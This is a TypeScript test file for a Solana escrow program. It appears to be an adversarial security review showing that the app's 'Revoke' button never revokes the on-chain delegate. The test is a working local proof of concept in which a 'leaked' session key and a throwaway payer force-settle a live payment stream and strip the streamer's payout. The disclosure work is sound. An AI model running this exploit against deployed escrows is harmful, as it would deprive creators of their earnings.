/**
 * CASI Escrow — "Revoke" doesn't actually revoke anything on-chain
 * (Fable, independent adversarial pass, 2026-08-28).
 *
 * App-layer finding, verified by direct code reading + grep, not a bug in
 * lib.rs itself:
 *
 *   - src/app/api/solana/delegates/revoke/route.ts's own doc comment says:
 *     "On-chain revoke is a separate streamer-signed tx (`revoke_delegate`)
 *     — this route only handles the DB side." The route only sets
 *     `streamer_delegates.revoked_at = now()`.
 *
 *   - The ONLY caller of that route, `revoke()` in
 *     src/app/studio/_components/DelegateKeyCard.tsx (lines ~160-177), does
 *     a single `fetch('/api/solana/delegates/revoke', ...)` and nothing
 *     else — no wallet popup, no `CasiEscrowClient` usage, no on-chain
 *     transaction of any kind.
 *
 *   - `grep -rn "revokeDelegate\b" src` (client method defined in
 *     src/lib/casi-escrow.ts) turns up exactly ONE call site in the entire
 *     app: the method's own definition. It is never invoked from any
 *     component, route, or script. The on-chain `revoke_delegate`
 *     instruction is completely unreachable from the shipped product.
 *
 * Net effect: clicking "Revoke" in Settings only flips a DB flag that gates
 * CASI's OWN server-side cranking routes (delegates/settle-beam,
 * delegates/approve-flash, etc. all check `if (delegate.revoked_at) return
 * 400`). It does NOT close the on-chain StreamerDelegate PDA. Per lib.rs,
 * there is no on-chain concept of "revoked" separate from the account being
 * closed — `session_key` + `expires_at` stay exactly as `set_delegate` left
 * them. So anyone who has obtained the raw session secret key some other
 * way (a `DELEGATE_ENCRYPTION_KEY` leak, a DB read, a backup snapshot) can
 * keep using it to sign the four delegated instructions DIRECTLY against
 * the program — bypassing CASI's server entirely — for as long as
 * MAX_DELEGATE_LIFETIME_SECS allows (up to 180 days), regardless of the
 * streamer having clicked Revoke.
 *
 * This file proves the on-chain half of the consequence: that the program
 * itself provides no way to distinguish "DB says revoked" from "still
 * fully authorized," and that the attacker doesn't even need CASI's real
 * cranker or any CASI infrastructure — a bare, self-funded throwaway
 * keypair is a complete substitute fee payer for every delegated
 * instruction. Combined, a "revoked" session key can still force a live
 * Active beam's streamer payout to zero (100% refunded to the viewer)
 * at will, indefinitely, using nothing but the leaked secret + a few cents
 * of the attacker's own SOL.
 *
 * The "revoke never reaches the chain" half is an app-layer fact proven by
 * direct code citation above (there's no on-chain behavior to execute that
 * would prove a function is never called — the absence of any call site is
 * the complete proof). This test proves the on-chain severity multiplier.
 *
 * Run with ./scripts/test-real-deploy.sh --grep "revoke"
 */

import * as anchor from "@coral-xyz/anchor";
import BN from "bn.js";
import {
  ASSOCIATED_TOKEN_PROGRAM_ID,
  TOKEN_PROGRAM_ID,
  createMint,
  getAccount,
  getAssociatedTokenAddressSync,
  getOrCreateAssociatedTokenAccount,
  mintTo,
} from "@solana/spl-token";
import {
  Keypair,
  LAMPORTS_PER_SOL,
  PublicKey,
  SystemProgram,
} from "@solana/web3.js";
import { expect } from "chai";
import { randomBytes } from "crypto";

const ESCROW_SEED = Buffer.from("casi-escrow");
const DELEGATE_SEED = Buffer.from("casi-delegate");
const CONFIG_SEED = Buffer.from("casi-config");
const REGISTRY_SEED = Buffer.from("casi-registry");
const USDC_DECIMALS = 6;
const TYPE_BEAM = 1;

function makeEscrowId(): number[] {
  return Array.from(randomBytes(32));
}

function derivePda(escrowId: number[], programId: PublicKey): PublicKey {
  const [pda] = PublicKey.findProgramAddressSync(
    [ESCROW_SEED, Buffer.from(escrowId)],
    programId,
  );
  return pda;
}

function deriveDelegatePda(streamer: PublicKey, programId: PublicKey): PublicKey {
  const [pda] = PublicKey.findProgramAddressSync(
    [DELEGATE_SEED, streamer.toBuffer()],
    programId,
  );
  return pda;
}

function nowSecs(): number {
  return Math.floor(Date.now() / 1000);
}

function sleep(ms: number): Promise<void> {
  return new Promise((r) => setTimeout(r, ms));
}

describe("casi-escrow — 'Revoke' button doesn't revoke on-chain (independent review, 2026-08-28)", () => {
  const provider = anchor.AnchorProvider.env();
  anchor.setProvider(provider);

  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  const program: any = anchor.workspace.CasiEscrow;
  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  const payer: Keypair = ((provider.wallet as any).payer) as Keypair;

  let usdcMint: PublicKey;
  let configPda: PublicKey;

  async function airdrop(pubkey: PublicKey, sol = 2) {
    const sig = await provider.connection.requestAirdrop(pubkey, sol * LAMPORTS_PER_SOL);
    await provider.connection.confirmTransaction(sig, "confirmed");
  }

  async function balanceOf(ata: PublicKey): Promise<bigint> {
    try {
      const acc = await getAccount(provider.connection, ata);
      return acc.amount;
    } catch {
      return 0n;
    }
  }

  before(async function () {
    this.timeout(30_000);
    [configPda] = PublicKey.findProgramAddressSync([CONFIG_SEED], program.programId);

    const existing = await provider.connection.getAccountInfo(configPda);
    if (existing) {
      const cfg = await program.account.globalConfig.fetch(configPda);
      usdcMint = cfg.acceptedMint as PublicKey;
      return;
    }

    usdcMint = await createMint(
      provider.connection, payer, payer.publicKey, null, USDC_DECIMALS,
    );
    const progInfo = await provider.connection.getAccountInfo(program.programId);
    if (!progInfo) throw new Error("casi_escrow program not found on localnet");
    const programDataAddress = new PublicKey(progInfo.data.slice(4, 36));
    await program.methods
      .initializeConfig(new BN(0), new BN(0))
      .accounts({
        initializer: payer.publicKey,
        config: configPda,
        acceptedMint: usdcMint,
        programData: programDataAddress,
        tokenProgram: TOKEN_PROGRAM_ID,
        systemProgram: SystemProgram.programId,
      })
      .signers([payer])
      .rpc();
  });

  it('a "revoked-per-DB" session key (revoke_delegate never actually called on-chain, matching production DelegateKeyCard.tsx behavior) still force-zeroes a real streamer\'s payout on a live Active beam, paid for by a throwaway attacker-funded keypair with zero involvement from the streamer, the viewer, or CASI\'s real cranker', async () => {
    const total = 10_000_000n; // 10 real USDC, locked by a real paying viewer
    const duration = 300n; // 5-minute beam — plenty of vesting a compromised key can steal back to zero

    // --- Normal, legitimate setup: streamer installs a delegate the honest
    // way, a real viewer books and funds a Beam, the streamer's session key
    // starts it. Everything up to here is the intended, working product.
    const streamer = Keypair.generate();
    const viewer = Keypair.generate();
    await airdrop(streamer.publicKey);
    await airdrop(viewer.publicKey);
    const [registryPda] = PublicKey.findProgramAddressSync(
      [REGISTRY_SEED, streamer.publicKey.toBuffer()],
      program.programId,
    );
    await program.methods
      .registerStreamer()
      .accounts({
        streamer: streamer.publicKey,
        registry: registryPda,
        systemProgram: SystemProgram.programId,
      })
      .signers([streamer])
      .rpc();

    const viewerAta = (
      await getOrCreateAssociatedTokenAccount(provider.connection, payer, usdcMint, viewer.publicKey)
    ).address;
    const streamerAta = getAssociatedTokenAddressSync(usdcMint, streamer.publicKey);
    await mintTo(provider.connection, payer, usdcMint, viewerAta, payer, total);

    const session = Keypair.generate(); // the real session secret — imagine this leaked
    await airdrop(session.publicKey); // only needed for start_beam_delegated's own signer requirement in this harness; the real product pays via the cranker
    const delegatePda = deriveDelegatePda(streamer.publicKey, program.programId);
    await program.methods
      .setDelegate(session.publicKey, new BN(nowSecs() + 3600))
      .accounts({
        streamer: streamer.publicKey,
        delegate: delegatePda,
        systemProgram: SystemProgram.programId,
      })
      .signers([streamer])
      .rpc();

    const escrowId = makeEscrowId();
    const escrowPda = derivePda(escrowId, program.programId);
    const vault = getAssociatedTokenAddressSync(usdcMint, escrowPda, true);
    await program.methods
      .initializeEscrow(escrowId, new BN(total.toString()), new BN(duration.toString()), TYPE_BEAM)
      .accounts({
        viewer: viewer.publicKey,
        streamer: streamer.publicKey,
        config: configPda,
        escrowState: escrowPda,
        vault,
        viewerAta,
        usdcMint,
        tokenProgram: TOKEN_PROGRAM_ID,
        associatedTokenProgram: ASSOCIATED_TOKEN_PROGRAM_ID,
        systemProgram: SystemProgram.programId,
      })
      .signers([viewer])
      .rpc();

    await program.methods
      .startBeamDelegated(escrowId)
      .accounts({
        session: session.publicKey,
        streamer: streamer.publicKey,
        delegate: delegatePda,
        escrowState: escrowPda,
      })
      .signers([session])
      .rpc();

    // --- Incident: the session secret leaks. The streamer, doing exactly
    // what the Settings page tells them to do, clicks "Revoke". In
    // production this calls ONLY POST /api/solana/delegates/revoke (DB
    // flag) — DelegateKeyCard.tsx's revoke() never builds or signs a
    // revoke_delegate transaction, and grepping the whole src/ tree turns
    // up zero other call sites for CasiEscrowClient.revokeDelegate(). We
    // model that exactly: no revoke_delegate call happens here either.
    // (If it did, the delegate PDA below would already be closed and this
    // whole test would fail at the next step with AccountNotInitialized —
    // which is precisely the state the real product is missing.)

    await sleep(1200); // let a little real vesting accrue, to prove the attacker can claw it back to ~0

    // --- Attacker has ONLY the leaked session secret. They have never
    // talked to CASI's servers, never touched the real cranker, and don't
    // need to — `cranker` in SettleBeamDelegated is an unconstrained
    // Signer, so a throwaway self-funded keypair is a complete substitute.
    const attackerCranker = Keypair.generate();
    await airdrop(attackerCranker.publicKey, 1);

    await program.methods
      .settleBeamDelegated(escrowId)
      .accounts({
        session: session.publicKey, // the "revoked" (per DB only) secret — still fully valid on-chain
        cranker: attackerCranker.publicKey, // nothing to do with CASI's real infra
        streamer: streamer.publicKey,
        viewer: viewer.publicKey,
        delegate: delegatePda,
        escrowState: escrowPda,
        vault,
        streamerAta,
        viewerAta,
        usdcMint,
        tokenProgram: TOKEN_PROGRAM_ID,
        associatedTokenProgram: ASSOCIATED_TOKEN_PROGRAM_ID,
        systemProgram: SystemProgram.programId,
      })
      .signers([session, attackerCranker])
      .rpc();

    // The attack succeeded: the beam is force-settled almost immediately
    // after starting, well before its real 5-minute duration. The streamer
    // gets whatever tiny sliver had vested in ~1.2s (near zero); everything
    // else — the vast majority of a real viewer's real payment — bounces
    // back to the viewer. Repeatable on every single beam this streamer
    // ever runs, for as long as the delegate's on-chain expires_at allows
    // (up to 180 days), because "Revoke" never touched this account.
    const streamerBal = await balanceOf(streamerAta);
    const viewerBal = await balanceOf(viewerAta);
    expect(streamerBal + viewerBal).to.equal(total); // conservation still holds — this is a payout-timing attack, not a mint bug
    expect(streamerBal < total / 20n).to.equal(true); // streamer got essentially nothing of their real revenue
    expect(viewerBal > (total * 19n) / 20n).to.equal(true);

    // escrow_state is fully CLOSED by settle_beam_delegated (Anchor `close =
    // viewer`), not left around in a "Settled" status — fetching it should
    // now fail entirely, which is itself confirmation the attack's on-chain
    // effect is final and irreversible (no un-settle path exists).
    let stillExists = true;
    try {
      await program.account.escrowState.fetch(escrowPda);
    } catch {
      stillExists = false;
    }
    expect(stillExists).to.equal(false);

    // And the delegate PDA the streamer believes is dead is, in fact, still
    // sitting right there, exactly as installed.
    const delegateStillLive = await program.account.streamerDelegate.fetch(delegatePda);
    expect(delegateStillLive.sessionKey.toBase58()).to.equal(session.publicKey.toBase58());
  });
});
